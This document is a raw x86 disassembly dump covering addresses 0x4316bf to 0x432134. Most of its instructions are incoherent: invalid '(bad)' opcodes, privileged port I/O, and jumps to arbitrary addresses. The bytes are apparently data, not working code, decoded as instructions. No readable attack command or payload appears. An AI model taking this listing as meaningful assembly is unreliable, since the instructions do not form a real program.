  4316bf:	shl    eax,0xd4
  4316c2:	std    
  4316c3:	lods   eax,DWORD PTR ds:[esi]
  4316c4:	outs   dx,DWORD PTR ds:[esi]
  4316c5:	ret    0x4112
  4316c8:	add    cl,cl
  4316ca:	or     BYTE PTR [eax+0x6815388c],dh
  4316d0:	mov    ebx,0xcf
	...
  4316ed:	add    BYTE PTR [eax],al
  4316ef:	add    BYTE PTR [esi],cl
  4316f1:	add    BYTE PTR [edx-0x55],bl
  4316f4:	adc    al,BYTE PTR [eax]
  4316f6:	push   edx
  4316f7:	bound  ebx,QWORD PTR [edi+0x68]
  4316fa:	and    cl,BYTE PTR [esi+0x2df25b2d]
  431700:	cmc    
  431701:	pop    es
  431702:	add    ebp,esi
  431704:	add    al,0xb2
  431706:	out    0xca,eax
  431708:	in     eax,0xff
  43170a:	jmp    DWORD PTR [ecx-0x2c]
  43170d:	mov    ecx,0xb20eedbd
  431712:	xchg   BYTE PTR [ecx-0x6f],bl
  431715:	call   0xd400:0xeeb24
  43171c:	cs call 0x520821
  431722:	call   0x433b6d
  431727:	pusha  
  431728:	test   BYTE PTR [esi+edi*8],bl
  43172b:	call   0x9d03943e
  431730:	adc    bl,dh
  431732:	pop    es
  431733:	push   ds
  431734:	inc    ebx
  431735:	daa    
  431736:	adc    ch,BYTE PTR [ecx-0x503fd9f2]
  43173c:	ror    DWORD PTR [edi-0x4e3658ff],1
  431742:	cli    
  431743:	jne    0x431737
  431745:	add    eax,DWORD PTR [edi+0x23cbb2f9]
  43174b:	fnsave [esi-0x51]
  43174e:	int3   
  43174f:	out    0x62,al
  431751:	daa    
  431752:	shl    BYTE PTR [esi+0x0],0x0
	...
  431771:	add    BYTE PTR [ebx],dl
  431773:	sbb    BYTE PTR [edi+0x42890929],al
  431779:	cmc    
  43177a:	cdq    
  43177b:	sbb    DWORD PTR [eax+eax*1],0x890002f5
  431782:	jb     0x4317ac
  431784:	cli    
  431785:	jmp    esp
  431787:	cmp    DWORD PTR [esi+0x28],0xffffffb6
  43178b:	add    al,BYTE PTR [eax]
  43178d:	mov    esi,DWORD PTR [edx-0x6b]
  431790:	mov    ebp,0x828ca408
  431795:	icebp  
  431796:	mov    WORD PTR [edx-0x5],ss
  431799:	push   DWORD PTR [esp+ebp*4-0x463dbbd]
  4317a0:	jae    0x4317a8
  4317a2:	add    ah,ah
  4317a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4317a5:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4317a7:	add    al,BYTE PTR [ebx+0x3c21ac6]
  4317ad:	add    bl,ch
  4317af:	ins    DWORD PTR es:[edi],dx
  4317b0:	and    al,0x2
  4317b2:	add    bh,BYTE PTR fs:[edi+0x408b1c06]
  4317b9:	add    ah,cl
  4317bb:	test   DWORD PTR [esi],ebx
  4317bd:	add    BYTE PTR [ecx+ecx*4-0x3a],dh
  4317c1:	jmp    0x39dc6f
  4317c6:	jb     0x431774
  4317c8:	mov    edx,0x65528001
  4317cd:	adc    al,0xb9
  4317cf:	jle    0x4317ed
  4317d1:	add    DWORD PTR [edx+eax*1],esp
  4317d4:	push   edx
  4317d5:	mov    eax,DWORD PTR [eax]
	...
  4317f3:	add    BYTE PTR ds:0x1ab5ede4,dl
  4317f9:	mov    bh,0xed
  4317fb:	ret    
  4317fc:	ss and ecx,DWORD PTR cs:[ebx-0x7af7e190]
  431804:	in     al,0x37
  431806:	or     DWORD PTR [ebx-0x72aff7cc],eax
  43180c:	xor    ebx,DWORD PTR [eax-0x1d]
  43180f:	stos   DWORD PTR es:[edi],eax
  431810:	mov    eax,ds:0xdebf6b3
  431815:	pop    ecx
  431816:	addr16 daa 
  431818:	pop    edx
  431819:	jmp    DWORD PTR [di-0x7]
  43181d:	ror    DWORD PTR [esi+0x56],1
  431820:	mov    BYTE PTR [esi],bl
  431822:	clc    
  431823:	out    0xc4,eax
  431825:	aam    0x5c
  431827:	sti    
  431828:	xchg   esp,eax
  431829:	(bad)  
  43182a:	es inc dl
  43182d:	addr16 mov ebp,0xb56711bd
  431833:	push   edx
  431834:	mov    dl,0xf3
  431836:	daa    
  431837:	adc    BYTE PTR [esi-0x168ba588],dl
  43183d:	ss addr16 mov ebp,0x8759d6bf
  431844:	xchg   ebp,eax
  431845:	in     al,0x59
  431847:	jp     0x43186f
  431849:	int    0x84
  43184b:	sub    BYTE PTR [edi],cl
  43184d:	addr16 (bad) 
  43184f:	std    
  431850:	(bad)  
  431851:	pop    eax
  431852:	mov    bl,bh
  431854:	stc    
  431855:	pop    esp
  431856:	xchg   BYTE PTR [eax+eax*1+0x0],cl
	...
  431876:	xor    DWORD PTR [ebx],esi
  431878:	nop
  431879:	inc    edx
  43187a:	stc    
  43187b:	shl    DWORD PTR [ecx],1
  43187d:	call   0xfb9fe631
  431882:	xchg   BYTE PTR [esi],ah
  431884:	mov    edx,0xff5f4f59
  431889:	dec    esi
  43188a:	fistp  DWORD PTR ds:0xd22123d3
  431890:	push   ebx
  431891:	sti    
  431892:	mov    ecx,0xa1faf342
  431897:	cmp    dh,bl
  431899:	out    0x0,eax
  43189b:	cli    
  43189c:	pop    ecx
  43189d:	sti    
  43189e:	xchg   BYTE PTR [edi],bl
  4318a0:	mov    bh,dl
  4318a2:	xchg   ebx,eax
  4318a3:	xchg   ebx,eax
  4318a4:	push   ebp
  4318a5:	xor    BYTE PTR ds:0xfffff69,0x0
  4318ac:	pop    ebp
  4318ad:	xor    BYTE PTR [esi-0x7d],bl
  4318b0:	fwait
  4318b1:	xor    bl,dh
  4318b3:	push   esp
  4318b4:	jmp    0x322ee839
  4318b9:	mov    edi,ecx
  4318bb:	addr16 cli 
  4318bd:	xchg   esi,eax
  4318be:	xlat   BYTE PTR ds:[ebx]
  4318bf:	push   esp
  4318c0:	cmp    DWORD PTR fs:[ecx+0x3],ebx
  4318c4:	pop    esi
  4318c5:	shr    dh,1
  4318c7:	jmp    0x431926
  4318c9:	xor    DWORD PTR [edx+0x7cb8913d],ecx
  4318cf:	push   ebp
  4318d0:	call   0x6007:0x813d8bb5
  4318d7:	push   ebp
  4318d8:	mov    bh,BYTE PTR [ebp+0x0]
	...
  4318f6:	add    BYTE PTR [eax],al
  4318f8:	inc    esp
  4318f9:	mov    DWORD PTR [esi-0x16fca747],esp
  4318ff:	mov    dh,0x8b
  431901:	arpl   WORD PTR [eax],bx
  431903:	mov    bl,0xdc
  431905:	mov    ah,dh
  431907:	pmaxub mm1,QWORD PTR [eax+0x278e5660]
  43190e:	out    0x3,eax
  431910:	or     eax,0x66df5fff
  431915:	add    al,0x65
  431917:	nop
  431918:	or     eax,0x5f86e900
  43191d:	add    al,0x6b
  43191f:	mov    BYTE PTR ds:0x4e88e900,cl
  431925:	addr16 (bad) 
  431927:	pop    ebp
  431928:	inc    esi
  431929:	push   esp
  43192a:	ins    DWORD PTR es:[edi],dx
  43192b:	inc    esp
  43192c:	sar    dl,0x65
  43192f:	dec    esp
  431930:	ss push 0x23968e94
  431936:	out    0x3,eax
  431938:	or     eax,0xc006a83
  43193d:	add    cl,ch
  43193f:	mov    dl,0x85
  431941:	ret    0xf0ff
  431944:	xchg   edi,eax
  431945:	mov    ebp,0x8c57010b
  43194a:	cli    
  43194b:	out    0x85,al
  43194d:	xchg   edi,eax
  43194e:	and    al,0xeb
  431950:	push   cs
  431951:	add    BYTE PTR [eax+0x16e9],bh
  431957:	adc    bh,BYTE PTR [ecx]
  431959:	pop    es
  43195a:	dec    ebp
  43195b:	mov    ecx,0x0
	...
  431978:	add    BYTE PTR [eax],al
  43197a:	test   DWORD PTR [ebp-0x4a7be5f5],edi
  431980:	pop    es
  431981:	shr    edi,0x8c
  431984:	cli    
  431985:	scas   al,BYTE PTR es:[edi]
  431986:	xchg   ebp,eax
  431987:	aad    0xfb
  431989:	aas    
  43198a:	pop    eax
  43198b:	(bad)  
  43198c:	and    al,0xeb
  43198e:	push   cs
  43198f:	add    BYTE PTR [edi-0x3192c95a],al
  431995:	mov    es,WORD PTR [ecx-0x77]
  431998:	inc    ebp
  431999:	icebp  
  43199a:	cmc    
  43199b:	cmp    eax,0xcd31cb74
  4319a0:	mul    DWORD PTR [edx+0x53]
  4319a3:	pop    es
  4319a4:	call   0xfb99b4a4
  4319a9:	push   0x5b
  4319ab:	sti    
  4319ac:	(bad)  
  4319ad:	fidivr WORD PTR [edi+0x7a]
  4319b0:	mov    ebx,0xf0d
  4319b5:	bound  edi,QWORD PTR [ebx]
  4319b7:	sti    
  4319b8:	xchg   BYTE PTR [edx+ecx*1-0x4f8a1c98],ch
  4319bf:	push   esi
  4319c0:	xchg   DWORD PTR [esi+edx*1+0x78e0e6ab],ebp
  4319c7:	push   esi
  4319c8:	jne    0x4319bb
  4319ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4319cb:	mov    ah,0xcd
  4319cd:	push   ds
  4319ce:	shl    DWORD PTR [esi+0x7cc2059],1
  4319d4:	add    BYTE PTR [ebp+edx*4+0x7f64],dh
  4319db:	add    ecx,DWORD PTR [esi-0x75]
	...
  4319fa:	add    BYTE PTR [eax],al
  4319fc:	cdq    
  4319fd:	dec    esi
  4319fe:	dec    esi
  4319ff:	mov    edi,ebp
  431a01:	stos   DWORD PTR es:[edi],eax
  431a02:	jle    0x431a2c
  431a04:	idiv   dh
  431a06:	inc    DWORD PTR [eax]
  431a08:	jge    0x431a43
  431a0a:	out    dx,eax
  431a0b:	je     0x431a58
  431a0d:	sub    esi,0xbf83577e
  431a13:	call   0x39d29e
  431a18:	push   0x8c6473bc
  431a1d:	sti    
  431a1e:	pop    es
  431a1f:	add    BYTE PTR [ecx+esi*8+0x28638def],dh
  431a26:	cli    
  431a27:	jmp    DWORD PTR [ebp+eax*1-0x77080fb3]
  431a2e:	jg     0x431a4c
  431a30:	mov    ch,0xfe
  431a32:	call   DWORD PTR [eax+0x2d]
  431a35:	dec    ecx
  431a36:	test   DWORD PTR [ecx+0x14e34be9],0x8bf6b5d8
  431a40:	and    DWORD PTR [eax],ecx
  431a42:	lea    eax,[edi-0x3b8]
  431a48:	push   ebx
  431a4a:	mov    BYTE PTR [ebp-0x14],al
  431a4d:	add    BYTE PTR [ebp+0x10],0xcc
  431a51:	sub    al,0xaf
  431a53:	(bad)  
  431a54:	shl    DWORD PTR [esi+0x40dffc74],cl
  431a5a:	or     ebp,eax
  431a5c:	cs imul esi,esi,0xffffffff
	...
  431a7c:	add    BYTE PTR [eax],al
  431a7e:	scas   eax,DWORD PTR es:[edi]
  431a7f:	inc    eax
  431a80:	repz mov esp,DWORD PTR [ecx+0x54ff4dc2]
  431a87:	mov    ch,0x74
  431a89:	or     BYTE PTR [eiz*2-0x15f20033],bl
  431a90:	mov    edx,0x568b11e6
  431a95:	jne    0x431aa0
  431a97:	cli    
  431a98:	rol    BYTE PTR [edi],1
  431a9a:	and    eax,0xafb359e
  431a9f:	imul   edi,DWORD PTR [ecx-0xcc3038],0x54
  431aa6:	xchg   BYTE PTR [ebx],ch
  431aa8:	mov    al,BYTE PTR [ebp+0x5]
  431aab:	out    0x62,al
  431aad:	or     al,0x3e
  431aaf:	adc    DWORD PTR [edi-0x304bea9b],ebp
  431ab5:	sti    
  431ab6:	ss das 
  431ab8:	xchg   esp,eax
  431ab9:	and    eax,0xfb12670d
  431abe:	push   es
  431abf:	mov    ds:0x24045ed0,al
  431ac4:	pop    eax
  431ac5:	jp     0x431b1d
  431ac7:	into   
  431ac8:	mov    edi,0x885a2707
  431acd:	jne    0x431a74
  431acf:	push   cs
  431ad0:	ins    BYTE PTR es:[edi],dx
  431ad1:	cwde   
  431ad2:	call   0xd27a1a3d
  431ad7:	push   esp
  431ad8:	ret    
  431ad9:	xchg   BYTE PTR [eax+0x4f],cl
  431adc:	in     eax,dx
  431add:	or     BYTE PTR [eax+0x570754],bl
	...
  431aff:	add    BYTE PTR [ebp-0x27],dh
  431b02:	pop    ds
  431b03:	add    BYTE PTR ds:0x37753f1e,cl
  431b09:	into   
  431b0a:	mov    edi,0x7c220efb
  431b0f:	daa    
  431b10:	dec    edi
  431b11:	fidiv  WORD PTR [esi]
  431b13:	rcl    DWORD PTR [esi-0x32],1
  431b16:	push   ecx
  431b17:	or     esp,DWORD PTR [edx-0x3e00a874]
  431b1d:	pop    esi
  431b1e:	mov    BYTE PTR [edx+0xf],al
  431b21:	ja     0x431b79
  431b23:	jne    0x431b2e
  431b25:	add    BYTE PTR [edx],ah
  431b27:	lock scas al,BYTE PTR es:[edi]
  431b29:	jmp    0xb7071ed6
  431b2e:	imul   eax,DWORD PTR [ebx-0x67],0xfffffff6
  431b32:	mov    al,BYTE PTR [eax]
  431b34:	mov    ch,dl
  431b36:	out    0x6e,eax
  431b38:	adc    cl,BYTE PTR [eax-0x2cbba864]
  431b3e:	hlt    
  431b3f:	(bad)  
  431b41:	in     eax,0xef
  431b43:	mov    edx,0x4b3db257
  431b48:	mov    bl,0x7
  431b4a:	jmp    0xe23cba57
  431b4f:	xchg   ecx,eax
  431b50:	push   edi
  431b51:	jmp    DWORD PTR [edi-0x5802fa9c]
  431b57:	ins    DWORD PTR es:[edi],dx
  431b58:	jmp    0x8668:0x11203550
  431b5f:	and    eax,0x59a6000d
	...
  431b80:	add    BYTE PTR [eax],al
  431b82:	inc    ecx
  431b83:	sbb    al,0xed
  431b85:	imul   esi,DWORD PTR [esp+ebx*1-0x17],0x3
  431b8a:	push   0xffffffaa
  431b8c:	pop    ebp
  431b8d:	push   0x824853c
  431b92:	dec    edx
  431b93:	stos   BYTE PTR es:[edi],al
  431b94:	sbb    esi,ebp
  431b96:	xchg   ebx,eax
  431b97:	mov    ch,0xc5
  431b99:	inc    esp
  431b9a:	or     ch,BYTE PTR [eax-0x17]
  431b9d:	iret   
  431b9e:	xor    al,0xc8
  431ba0:	hlt    
  431ba1:	and    eax,0x8cfacbc5
  431ba6:	enter  0x63ef,0x44
  431baa:	push   ss
  431bab:	jl     0x431b96
  431bad:	add    cl,BYTE PTR ds:0xbe042200
  431bb3:	(bad)  
  431bb4:	call   0xe98d7fbc
  431bb9:	add    ecx,DWORD PTR ds:0xdaac0039
  431bbf:	(bad)  
  431bc0:	(bad)  
  431bc1:	call   0x2e537494
  431bc6:	jb     0x431c1c
  431bc8:	add    cl,ch
  431bca:	push   cs
  431bcb:	shl    dh,0xee
  431bce:	int    0xba
  431bd0:	sti    
  431bd1:	jmp    0x72c31be4
  431bd6:	push   edx
  431bd7:	add    al,0xb6
  431bd9:	jmp    0xca431beb
  431bde:	dec    eax
  431bdf:	mov    DWORD PTR [eax],eax
  431be1:	in     eax,0xe
  431be3:	add    BYTE PTR [edi],dh
  431be5:	test   al,0x0
	...
  431c03:	add    ch,dl
  431c05:	and    esi,DWORD PTR [esi+edx*1+0x6a]
  431c09:	inc    eax
  431c0a:	je     0x431c26
  431c0c:	cli    
  431c0d:	inc    DWORD PTR [eax]
  431c0f:	jmp    0x450f022
  431c14:	or     DWORD PTR [esi-0x5],ecx
  431c17:	jmp    0xe98026f6
  431c1c:	or     DWORD PTR [eax],eax
  431c1e:	add    BYTE PTR [eax+esi*2],dh
  431c21:	out    0xfd,al
  431c23:	xchg   ecx,eax
  431c24:	or     dh,ah
  431c26:	add    eax,DWORD PTR [edx+0x38]
  431c29:	cmc    
  431c2a:	cmp    al,0xe9
  431c2c:	mov    ds:0x815fb4f,eax
  431c31:	or     eax,0xeef00
  431c36:	je     0x431c00
  431c38:	sub    DWORD PTR [esi+0x37196175],ecx
  431c3e:	aas    
  431c3f:	add    ecx,DWORD PTR [ecx]
  431c41:	stos   DWORD PTR es:[edi],eax
  431c42:	push   edx
  431c43:	push   ecx
  431c44:	shr    ch,1
  431c46:	(bad)  
  431c47:	call   0x5fc86ce5
  431c4c:	push   ebx
  431c4d:	cli    
  431c4e:	xchg   BYTE PTR [esi+ebx*2-0x6fff3f7c],ah
  431c55:	sub    eax,0x30df3888
  431c5a:	gs add eax,0x461bccf
  431c60:	int3   
  431c61:	or     BYTE PTR [edx],bl
  431c63:	add    BYTE PTR [esi+ecx*8],ah
  431c66:	mov    edi,0x74
	...
  431c83:	add    BYTE PTR [eax],al
  431c85:	add    BYTE PTR [ecx],dh
  431c87:	test   BYTE PTR [eax],cl
  431c89:	dec    DWORD PTR [edi]
  431c8b:	add    eax,0x45afc02b
  431c90:	pop    es
  431c91:	sar    ebp,0x3
  431c94:	and    cl,0xf5
  431c97:	jns    0x431c97
  431c99:	xchg   DWORD PTR [edx-0x7e3f7bb2],ebp
  431c9f:	cld    
  431ca0:	add    BYTE PTR [ebp-0xc],0x7f
  431ca4:	shl    BYTE PTR [ebp+esi*1+0x7d],0x38
  431ca9:	jmp    0x431ca4
  431cab:	pop    ebx
  431cac:	jnp    0x431cae
  431cae:	in     al,0x2
  431cb0:	dec    ebx
  431cb1:	push   0xffffffe7
  431cb3:	mov    ch,0x74
  431cb5:	cld    
  431cb6:	mov    esi,DWORD PTR [eax]
  431cb8:	add    ebp,eax
  431cba:	jmp    0x73c4:0x30fff5c2
  431cc1:	add    al,0x3f
  431cc3:	push   cs
  431cc4:	jecxz  0x431cf1
  431cc6:	pop    ds
  431cc7:	sub    DWORD PTR [ebx],ecx
  431cc9:	test   DWORD PTR [ebx+0x2f],edi
  431ccc:	add    edi,edi
  431cce:	mov    eax,ds:0xa4400b06
  431cd3:	jnp    0x431cd4
  431cd5:	mov    cl,dl
  431cd7:	jg     0x431cd0
  431cd9:	je     0x431d44
  431cdb:	jns    0x431c9c
  431cdd:	call   0x38de45
  431ce2:	mov    bl,0xda
  431ce4:	cwde   
  431ce5:	and    dh,BYTE PTR [edx+eax*1+0x4e]
  431ce9:	call   0x431cee
	...
  431d06:	add    BYTE PTR [eax],al
  431d08:	or     eax,0xd001dca
  431d0d:	fimul  DWORD PTR [ebx-0x5]
  431d10:	mov    dl,0xa6
  431d12:	mov    dh,0xc8
  431d14:	dec    edi
  431d15:	pop    esp
  431d16:	inc    DWORD PTR [ebp+ecx*2+0x357f128c]
  431d1d:	sbb    eax,0xa48e35d0
  431d22:	sbb    eax,DWORD PTR [ecx*1-0x5e80f18b]
  431d29:	cmp    al,0x7
  431d2b:	add    BYTE PTR [esi-0x58fa27a8],al
  431d31:	ins    DWORD PTR es:[edi],dx
  431d32:	push   edx
  431d33:	adc    eax,0xffbf2941
  431d38:	imul   DWORD PTR [ecx]
  431d3a:	push   edx
  431d3b:	je     0x431d6e
  431d3d:	pop    edi
  431d3e:	push   edx
  431d3f:	je     0x431d6a
  431d41:	dec    edi
  431d42:	scas   eax,DWORD PTR es:[edi]
  431d43:	out    0xbc,eax
  431d45:	call   0x16dc:0x9788fb55
  431d4c:	nop
  431d4d:	xor    eax,0x2cd213cb
  431d52:	add    ecx,DWORD PTR [edi]
  431d54:	dec    ebp
  431d55:	push   edi
  431d56:	mov    WORD PTR [edx],es
  431d58:	mov    dh,0x61
  431d5a:	xor    dl,0x41
  431d5d:	cmp    al,BYTE PTR gs:[edx]
  431d60:	pop    edx
  431d61:	push   edi
  431d62:	(bad)  
  431d63:	dec    DWORD PTR [esi+0x15be528f]
  431d69:	push   edi
  431d6a:	mov    al,0x86
	...
  431d88:	add    BYTE PTR [eax],al
  431d8a:	test   eax,0x9d86aa0a
  431d8f:	mov    dh,BYTE PTR [esi]
  431d91:	aaa    
  431d92:	jle    0x431de7
  431d94:	(bad)  
  431d95:	jle    0x431d1a
  431d97:	(bad)  
  431d98:	retf   0x3441
  431d9b:	cld    
  431d9c:	or     esi,DWORD PTR [esp+ecx*8-0x1]
  431da0:	and    BYTE PTR [esi-0x75122bf2],dh
  431da6:	pminub mm4,mm6
  431da9:	mov    dl,0xcb
  431dab:	push   edi
  431dac:	rol    BYTE PTR [edx+0x57],0x4d
  431db0:	outs   dx,BYTE PTR ds:[esi]
  431db1:	or     eax,0xba47ada
  431db6:	fnsave [ecx+esi*1-0xcb2ed30]
  431dbd:	push   esi
  431dbe:	sbb    BYTE PTR [esi+esi*8+0x29842ac3],bh
  431dc5:	iret   
  431dc6:	or     DWORD PTR [edi],eax
  431dc8:	xchg   esp,eax
  431dc9:	or     esp,DWORD PTR [ecx+0x6d05dee]
  431dcf:	or     esi,esi
  431dd1:	into   
  431dd2:	and    ecx,DWORD PTR [ebp-0x2c]
  431dd5:	pop    es
  431dd6:	adc    al,al
  431dd8:	call   0xd89c2d69
  431ddd:	mov    cl,dh
  431ddf:	pop    eax
  431de0:	stc    
  431de1:	mov    BYTE PTR [eax-0x4],dl
  431de4:	sbb    eax,0xaa065941
  431de9:	add    al,0x3e
  431deb:	add    cl,ch
  431ded:	add    eax,DWORD PTR [eax]
	...
  431e0b:	add    BYTE PTR [edx+0x38],dl
  431e0e:	ret    0x63b6
  431e11:	stos   DWORD PTR es:[edi],eax
  431e12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431e13:	or     al,0xd
  431e15:	mov    bl,0x5d
  431e17:	push   0x8912af5c
  431e1c:	mov    esp,0x57d09b82
  431e21:	sbb    DWORD PTR [ebx+0x65ba1955],0xf8d40d6c
  431e2b:	retf   
  431e2c:	push   ds
  431e2d:	clc    
  431e2e:	xor    bh,cl
  431e30:	inc    edi
  431e31:	(bad)  
  431e33:	mov    ebx,0xba00046b
  431e38:	into   
  431e39:	mov    edi,0x401debe6
  431e3e:	push   eax
  431e3f:	jb     0x431deb
  431e41:	add    al,0x99
  431e43:	mov    ebx,0x4102859e
  431e48:	in     eax,0x8d
  431e4a:	cli    
  431e4b:	dec    esi
  431e4c:	lea    edi,[edi]
  431e4e:	je     0x431e2a
  431e50:	loope  0x431e63
  431e52:	lea    esi,[esi+eiz*8-0x1cd463a9]
  431e59:	dec    eax
  431e5a:	test   BYTE PTR [ecx],ch
  431e5c:	pop    ebp
  431e5d:	add    eax,DWORD PTR [edi+0x1764c6ac]
  431e63:	fs mov eax,0x2a1613d3
  431e69:	clc    
  431e6a:	push   cs
  431e6b:	test   eax,0x1203770e
	...
  431e8c:	add    BYTE PTR [eax],al
  431e8e:	pop    ss
  431e8f:	test   ebx,edi
  431e91:	jne    0x431e93
  431e93:	aas    
  431e94:	add    ebx,DWORD PTR [esi+0x6a00000e]
  431e9a:	inc    ecx
  431e9b:	inc    edi
  431e9c:	pop    edx
  431e9d:	mov    al,0x4c
  431e9f:	add    al,0x0
  431ea1:	fs push eax
  431ea3:	aam    0x1e
  431ea5:	push   0x40
  431ea7:	inc    edi
  431ea8:	je     0x431e99
  431eaa:	mov    eax,ds:0x616c3a82
  431eaf:	aam    0xc
  431eb1:	jb     0x431eb4
  431eb3:	pop    eax
  431eb4:	mov    esp,0x534760a8
  431eb9:	rcr    DWORD PTR [eax],0x21
  431ebc:	add    cl,ch
  431ebe:	js     0x431f23
  431ec0:	cmp    al,cl
  431ec2:	push   cs
  431ec3:	add    BYTE PTR [edi],ch
  431ec5:	test   eax,0xa9858a61
  431eca:	ret    0xc301
  431ecd:	add    BYTE PTR [esp+ebx*4-0x5],dh
  431ed1:	push   DWORD PTR [eax+eax*4-0x38]
  431ed5:	jmp    DWORD PTR [edi-0x1a137d66]
  431edb:	loop   0x431ee4
  431edd:	add    dh,BYTE PTR [edi+edi*8+0x4e]
  431ee1:	mov    eax,DWORD PTR [ecx+0x47]
  431ee4:	mov    WORD PTR [ebp-0x94e44],es
  431eea:	xchg   esp,eax
  431eeb:	js     0x431f32
  431eed:	or     ah,bl
  431eef:	out    dx,al
  431ef0:	stc    
  431ef1:	inc    DWORD PTR [eax]
	...
  431f0f:	add    BYTE PTR [esp+edx*4],dh
  431f12:	jg     0x431ed4
  431f14:	js     0x431f71
  431f16:	div    BYTE PTR [ebp+0x58]
  431f19:	add    BYTE PTR [ebp-0x94c0e08],0xff
  431f20:	jns    0x431f25
  431f22:	push   eax
  431f23:	call   0x39d167
  431f28:	in     eax,dx
  431f29:	mov    edi,0xc9e84582
  431f2e:	mov    edi,0xbea74
  431f33:	push   edi
  431f34:	in     al,0xfe
  431f36:	inc    DWORD PTR [edx-0x3c374bd4]
  431f3c:	pop    edi
  431f3d:	cmp    BYTE PTR [edi],bl
  431f3f:	add    al,0x1a
  431f41:	scas   eax,DWORD PTR es:[edi]
  431f42:	jae    0x431f68
  431f44:	aam    0xc9
  431f46:	jae    0x431f6c
  431f48:	fsubr  QWORD PTR [ebp-0x591bdb8d]
  431f4e:	aas    
  431f4f:	inc    BYTE PTR [ebx+0x2fc355ae]
  431f55:	cmp    BYTE PTR [edi],bl
  431f57:	add    al,0x1b
  431f59:	scas   eax,DWORD PTR es:[edi]
  431f5a:	jae    0x431f80
  431f5c:	test   al,0xc9
  431f5e:	jnp    0x431f84
  431f60:	cwde   
  431f61:	lods   eax,DWORD PTR ds:[esi]
  431f62:	jae    0x431f88
  431f64:	or     eax,0x93775749
  431f69:	jns    0x431fba
  431f6b:	pop    ebx
  431f6c:	dec    esi
  431f6d:	int    0xc7
  431f6f:	and    edx,DWORD PTR ds:0x747af3
	...
  431f91:	add    BYTE PTR [ecx],dh
  431f93:	popa   
  431f94:	push   edi
  431f95:	inc    edx
  431f96:	jb     0x431f71
  431f98:	dec    esi
  431f99:	pop    edx
  431f9a:	dec    esi
  431f9b:	int    0xc7
  431f9d:	and    edx,DWORD PTR [ecx]
  431f9f:	into   
  431fa0:	mov    edi,0x4e8a1123
  431fa5:	je     0x431fd0
  431fa7:	sub    eax,0x60f17c7a
  431fac:	push   edi
  431fad:	rol    DWORD PTR [ebx+0x9],0x4f
  431fb1:	pop    ebx
  431fb2:	dec    esi
  431fb3:	imul   edi,DWORD PTR [edx-0x14],0xffffff8c
  431fb7:	or     al,0xfc
  431fb9:	std    
  431fba:	sub    bl,BYTE PTR [eax-0x4a]
  431fbd:	xchg   BYTE PTR [eax+0x15858048],ah
  431fc3:	repz dec esi
  431fc5:	sti    
  431fc6:	mov    ebp,0xf507c8dd
  431fcb:	test   al,0x4
  431fcd:	add    BYTE PTR ds:0x81c0836a,cl
  431fd3:	sub    eax,DWORD PTR [eax+0x4e5cf585]
  431fd9:	sti    
  431fda:	cmp    eax,0xe3c4402f
  431fdf:	sub    al,BYTE PTR [ebx+0x125b61c0]
  431fe5:	rol    ah,0x96
  431fe8:	or     al,0xca
  431feb:	nop
  431fec:	inc    edx
  431fed:	push   ebp
  431fee:	xchg   esi,eax
  431fef:	cmp    eax,DWORD PTR [esp+ebp*8-0xaae3]
	...
  432012:	add    BYTE PTR [eax],al
  432014:	pop    esi
  432015:	icebp  
  432016:	mov    dh,0x65
  432018:	push   cs
  432019:	add    BYTE PTR [eax+ebx*8-0x66],dh
  43201d:	test   eax,0xc630e50e
  432022:	xor    BYTE PTR [edi+eax*4-0x68],bl
  432026:	mov    dl,BYTE PTR [edx-0x11]
  432029:	jbe    0x432016
  43202b:	xchg   BYTE PTR [edi-0x2],cl
  43202e:	sub    ecx,ebx
  432030:	imul   ecx,DWORD PTR ds:0xc385e9a9,0xefd07e6a
  43203a:	adc    eax,0xe4c7e22f
  43203f:	add    al,0xe0
  432041:	add    bl,BYTE PTR [esi-0x2d]
  432044:	or     dl,BYTE PTR [ebp-0x19]
  432047:	push   ss
  432048:	aas    
  432049:	jnp    0x4320b7
  43204b:	push   ebx
  43204c:	inc    eax
  43204d:	dec    ecx
  43204e:	cmp    dh,BYTE PTR [ebx+0x5280fd32]
  432054:	ss mov al,0x5b
  432057:	enter  0xb022,0x67
  43205b:	dec    ecx
  43205c:	out    dx,eax
  43205d:	add    ebp,ecx
  43205f:	add    edi,DWORD PTR [edi-0x20c03b8]
  432065:	mov    edi,0xd3cd88e8
  43206a:	xchg   ecx,eax
  43206b:	or     BYTE PTR [eax-0x9ae03b1],0xaf
  432072:	icebp  
  432073:	neg    DWORD PTR [esi+0x3a8ec]
	...
  432095:	add    BYTE PTR [edx-0x22788bc9],dl
  43209b:	dec    edx
  43209c:	ficom  DWORD PTR [ecx-0x7c]
  43209f:	mov    edx,0xd3c50cf8
  4320a4:	xor    eax,0x6dfc487d
  4320a9:	xlat   BYTE PTR ds:[ebx]
  4320aa:	or     bh,BYTE PTR [ebp-0x5e]
  4320ad:	push   edx
  4320ae:	cmp    al,BYTE PTR [edx+0x0]
  4320b1:	jmp    0x432109
  4320b3:	pop    esi
  4320b4:	jecxz  0x432064
  4320b6:	cmp    al,0x11
  4320b8:	mov    edi,0x4eb8ff25
  4320bd:	ss push edi
  4320bf:	mov    eax,0xb9991cfa
  4320c4:	dec    esi
  4320c5:	mov    es,WORD PTR [edx+0x92910e0]
  4320cb:	adc    DWORD PTR [edi-0x8eee701],edi
  4320d1:	test   DWORD PTR [ebx+edi*2],0xa716b90c
  4320d8:	cli    
  4320d9:	fst    QWORD PTR [ecx+edx*1]
  4320dc:	ret    
  4320dd:	fsubr  QWORD PTR [eax-0x80]
  4320e0:	sbb    ebx,eax
  4320e2:	or     al,bl
  4320e4:	dec    ebx
  4320e5:	bound  edx,QWORD PTR [ecx+0x48]
  4320e8:	cli    
  4320e9:	mov    esp,0xad154546
  4320ee:	xor    al,0x8
  4320f0:	add    dl,bh
  4320f2:	into   
  4320f3:	enter  0xddc3,0x4e
  4320f7:	popa   
  4320f8:	(bad)  
  4320f9:	fld    DWORD PTR [eax]
	...
  432117:	add    dh,cl
  432119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43211a:	pop    ecx
  43211b:	ret    0x88d7
  43211e:	das    
  43211f:	sub    DWORD PTR [ecx-0x77],ecx
  432122:	das    
  432123:	sub    DWORD PTR [eax-0x53],edx
  432126:	xchg   BYTE PTR ds:0x973c5488,dl
  43212c:	mov    ch,0x7e
  43212e:	jge    0x432105
  432130:	mov    ch,0x4a
  432132:	jne    0x432105
  432134:	enter  0x6947,0xe9
